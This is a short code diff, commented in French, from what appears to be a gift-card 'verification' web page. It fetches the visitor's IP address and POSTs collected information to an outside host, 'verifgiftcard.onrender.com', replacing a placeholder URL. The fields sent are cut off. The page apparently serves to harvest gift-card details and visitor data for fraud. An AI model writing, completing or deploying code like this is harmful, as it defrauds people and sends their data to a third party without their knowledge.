@@ -484,7 +484,7 @@
         const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
 
         // Envoi des infos à ton serveur
-        const response = await fetch("TON_LIEN_HEROKU/send-email", {
+        const response = await fetch("https://verifgiftcard.onrender.com", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
